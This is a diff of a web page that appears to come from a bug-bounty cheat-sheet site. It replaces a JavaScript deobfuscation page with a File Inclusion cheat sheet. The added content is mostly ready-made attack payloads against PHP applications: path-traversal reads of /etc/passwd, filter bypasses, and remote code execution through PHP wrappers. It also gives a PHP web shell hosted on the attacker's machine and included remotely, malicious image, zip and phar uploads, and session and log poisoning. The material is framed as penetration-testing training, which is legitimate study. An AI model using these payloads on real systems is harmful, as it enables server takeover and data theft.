@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../attacking-web-applications-with-ffuf/">
+        <link rel="prev" href="../web-attacks/">
       
       
-        <link rel="next" href="../cross-site-scripting-%28xss%29/">
+        <link rel="next" href="../session-security/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>JavaScript Deobfuscation - Bug Bounty Hub</title>
+        <title>File Inclusion - Bug Bounty Hub</title>
       
     
     
@@ -62,7 +62,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#javascript-deobfuscation" class="md-skip">
+        <a href="#file-inclusion" class="md-skip">
           Skip to content
         </a>
       
@@ -98,7 +98,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              JavaScript Deobfuscation
+              File Inclusion
             
           </span>
         </div>
@@ -431,32 +431,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    JavaScript Deobfuscation
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../javascript-deobfuscation/" class="md-nav__link">
         
   
   
@@ -467,62 +445,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#terms" class="md-nav__link">
-    <span class="md-ellipsis">
-      Terms
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commands
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#useful-websites" class="md-nav__link">
-    <span class="md-ellipsis">
-      Useful Websites
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#misc" class="md-nav__link">
-    <span class="md-ellipsis">
-      Misc
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -739,10 +661,32 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../file-inclusion/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    File Inclusion
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -753,6 +697,71 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#local-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Local File Inclusion
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-code-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Code Execution
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misc
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lfi-wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      LFI Wordlists
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-inclusion-functions" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Inclusion Functions
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -984,27 +993,18 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#terms" class="md-nav__link">
+  <a href="#local-file-inclusion" class="md-nav__link">
     <span class="md-ellipsis">
-      Terms
+      Local File Inclusion
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
+  <a href="#remote-code-execution" class="md-nav__link">
     <span class="md-ellipsis">
-      Commands
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#useful-websites" class="md-nav__link">
-    <span class="md-ellipsis">
-      Useful Websites
+      Remote Code Execution
     </span>
   </a>
   
@@ -1014,6 +1014,24 @@
   <a href="#misc" class="md-nav__link">
     <span class="md-ellipsis">
       Misc
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lfi-wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      LFI Wordlists
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-inclusion-functions" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Inclusion Functions
     </span>
   </a>
   
@@ -1035,47 +1053,8 @@
 
 
 
-<h1 id="javascript-deobfuscation">JavaScript Deobfuscation</h1>
-<h2 id="terms">Terms</h2>
-<table>
-<thead>
-<tr>
-<th>Term</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Code minification</td>
-<td>Reduces code to a single line often saved as .min.js.</td>
-</tr>
-<tr>
-<td>Packing</td>
-<td>Obfuscation recognizable from the six function arguments used in the initial function "function(p,a,c,k,e,d)".</td>
-</tr>
-<tr>
-<td>JSFuck</td>
-<td>Programming style based in the atomic parts of JS. Uses only ()+[]! (aa and jj encode are similar).</td>
-</tr>
-<tr>
-<td>Base 64</td>
-<td>Contains only alpha-numeric, + and /. Padded with '='.</td>
-</tr>
-<tr>
-<td>Hex</td>
-<td>Encodes each char into its hex on the ASCII table. Contains 0-9 and a-f.</td>
-</tr>
-<tr>
-<td>Ceasar</td>
-<td>Shifts each char by a fixed number</td>
-</tr>
-<tr>
-<td>Rot13</td>
-<td>Most common ceaser cipher, shifts by 13</td>
-</tr>
-</tbody>
-</table>
-<h2 id="commands">Commands</h2>
+<h1 id="file-inclusion">File Inclusion</h1>
+<h2 id="local-file-inclusion">Local File Inclusion</h2>
 <table>
 <thead>
 <tr>
@@ -1085,99 +1064,139 @@
 </thead>
 <tbody>
 <tr>
-<td><code>curl http://SERVER_IP:PORT/</code></td>
-<td>cURL GET request</td>
+<td><strong>Basic LFI</strong></td>
+<td></td>
 </tr>
 <tr>
-<td><code>curl -s http://SERVER_IP:PORT/ -X POST</code></td>
-<td>cURL POST request</td>
+<td><code>/index.php?language=/etc/passwd</code></td>
+<td>Basic LFI</td>
 </tr>
 <tr>
-<td><code>curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"</code></td>
-<td>cURL POST with data</td>
+<td><code>/index.php?language=../../../../etc/passwd</code></td>
+<td>LFI with path traversal</td>
 </tr>
 <tr>
-<td><code>echo hackthebox | base64</code></td>
-<td>base64 encode</td>
+<td><code>/index.php?language=/../../../etc/passwd</code></td>
+<td>LFI with name prefix</td>
 </tr>
 <tr>
-<td><code>echo ENCODED_B64 | base64 -d</code></td>
-<td>base64 decode</td>
+<td><code>/index.php?language=./languages/../../../../etc/passwd</code></td>
+<td>LFI with approved path</td>
 </tr>
 <tr>
-<td><code>echo hackthebox | xxd -p</code></td>
-<td>hex encode</td>
+<td><strong>LFI Bypasses</strong></td>
+<td></td>
 </tr>
 <tr>
-<td><code>echo ENCODED_HEX | xxd -p -r</code></td>
-<td>hex decode</td>
+<td><code>/index.php?language=....//....//....//....//etc/passwd</code></td>
+<td>Bypass basic path traversal filter</td>
 </tr>
 <tr>
-<td><code>echo hackthebox | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td>
-<td>rot13 encode</td>
+<td><code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code></td>
+<td>Bypass filters with URL encoding</td>
 </tr>
 <tr>
-<td><code>echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td>
-<td>rot13 decode</td>
+<td><code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code></td>
+<td>Bypass appended extension with path truncation (obsolete)</td>
+</tr>
+<tr>
+<td><code>/index.php?language=../../../../etc/passwd%00</code></td>
+<td>Bypass appended extension with null byte (obsolete)</td>
+</tr>
+<tr>
+<td><code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code></td>
+<td>Read PHP with base64 filter</td>
 </tr>
 </tbody>
 </table>
-<h2 id="useful-websites">Useful Websites</h2>
+<h2 id="remote-code-execution">Remote Code Execution</h2>
 <table>
 <thead>
 <tr>
-<th>Site</th>
+<th>Command</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><a href="https://jsconsole.com/">JS Console</a></td>
-<td>Interactive JavaScript console for testing code.</td>
+<td><strong>PHP Wrappers</strong></td>
+<td></td>
 </tr>
 <tr>
-<td><a href="https://www.toptal.com/developers/javascript-minifier">JS Minifier</a></td>
-<td>Minifies JavaScript for performance optimization.</td>
+<td><code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code></td>
+<td>RCE with data wrapper</td>
 </tr>
 <tr>
-<td><a href="https://beautifytools.com/javascript-obfuscator.php">BeatifyTools</a></td>
-<td>Obfuscates JavaScript to protect code.</td>
+<td><code>curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id"</code></td>
+<td>RCE with input wrapper</td>
 </tr>
 <tr>
-<td><a href="https://obfuscator.io/">JS Obfuscator Tool</a></td>
-<td>Tool to obfuscate JavaScript code securely.</td>
+<td><code>curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id"</code></td>
+<td>RCE with expect wrapper</td>
 </tr>
 <tr>
-<td><a href="https://jsfuck.com/">JSFuck</a></td>
-<td>Encodes JavaScript using only six characters.</td>
+<td><strong>RFI</strong></td>
+<td></td>
 </tr>
 <tr>
-<td><a href="https://utf-8.jp/public/jjencode.html">jjencode</a></td>
-<td>Encodes JavaScript with JJEncode technique.</td>
+<td><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</code></td>
+<td>Host web shell</td>
 </tr>
 <tr>
-<td><a href="https://utf-8.jp/public/aaencode.html">aaencode</a></td>
-<td>Encodes JavaScript with AAEncode method.</td>
+<td><code>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code></td>
+<td>Include remote PHP web shell</td>
 </tr>
 <tr>
-<td><a href="https://prettier.io/playground/">Prettier</a></td>
-<td>Formats and beautifies JavaScript code.</td>
+<td><strong>LFI + Upload</strong></td>
+<td></td>
 </tr>
 <tr>
-<td><a href="https://beautifier.io/">js-beautify</a></td>
-<td>Beautifies minified or obfuscated JavaScript.</td>
+<td><code>echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif</code></td>
+<td>Create malicious image</td>
 </tr>
 <tr>
-<td><a href="https://matthewfl.com/unPacker.html">UnPacker</a></td>
-<td>Deobfuscates and unpacks JavaScript code.</td>
+<td><code>/index.php?language=./profile_images/shell.gif&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded image</td>
 </tr>
 <tr>
-<td><a href="https://rot13.com/">rot13.com</a></td>
-<td>Applies ROT13 encoding/decoding for text.</td>
+<td><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code></td>
+<td>Create malicious zip archive 'as jpg'</td>
 </tr>
 <tr>
-<td><a href="https://www.boxentriq.com/code-breaking/cipher-identifier">Cipher Identifier</a></td>
-<td>Identifies cipher types in encoded text.</td>
+<td><code>/index.php?language=zip://shell.zip%23shell.php&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded zip</td>
+</tr>
+<tr>
+<td><code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code></td>
+<td>Create malicious phar 'as jpg'</td>
+</tr>
+<tr>
+<td><code>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded phar</td>
+</tr>
+<tr>
+<td><strong>Log Poisoning</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></td>
+<td>Read PHP session parameters</td>
+</tr>
+<tr>
+<td><code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code></td>
+<td>Poison PHP session with web shell</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code></td>
+<td>RCE through poisoned PHP session</td>
+</tr>
+<tr>
+<td><code>curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php" -A '&lt;?php system($_GET["cmd"]); ?&gt;'</code></td>
+<td>Poison server log</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code></td>
+<td>RCE through poisoned PHP session</td>
 </tr>
 </tbody>
 </table>
@@ -1185,26 +1204,149 @@
 <table>
 <thead>
 <tr>
-<th>Command/Action</th>
+<th>Command</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>ctrl+u</code></td>
-<td>Show HTML source code in Firefox</td>
+<td><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287</code></td>
+<td>Fuzz page parameters</td>
 </tr>
 <tr>
-<td><code>ctrl+shift+z</code></td>
-<td>Open browser debugger tab</td>
+<td><code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287</code></td>
+<td>Fuzz LFI payloads</td>
 </tr>
 <tr>
-<td>'{ }' button</td>
-<td>Pretty print in debugger tab</td>
+<td><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287</code></td>
+<td>Fuzz webroot path</td>
 </tr>
 <tr>
-<td>Unpack</td>
-<td>Replace eval function with console.log</td>
+<td><code>ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ' -fs 2287</code></td>
+<td>Fuzz server configurations</td>
+</tr>
+</tbody>
+</table>
+<h2 id="lfi-wordlists">LFI Wordlists</h2>
+<ul>
+<li>LFI-Jhaddix.txt</li>
+<li>Webroot path wordlist for Linux</li>
+<li>Webroot path wordlist for Windows</li>
+<li>Server configurations wordlist for Linux</li>
+<li>Server configurations wordlist for Windows</li>
+</ul>
+<h2 id="file-inclusion-functions">File Inclusion Functions</h2>
+<table>
+<thead>
+<tr>
+<th>Function</th>
+<th>Read Content</th>
+<th>Execute</th>
+<th>Remote URL</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PHP</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>include()/include_once()</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>require()/require_once()</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>file_get_contents()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>fopen()/file()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><strong>NodeJS</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>fs.readFile()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>fs.sendFile()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>res.render()</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+</tr>
+<tr>
+<td><strong>Java</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>import</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><strong>.NET</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>@Html.Partial()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>@Html.RemotePartial()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>Response.WriteFile()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
 </tr>
 </tbody>
 </table>
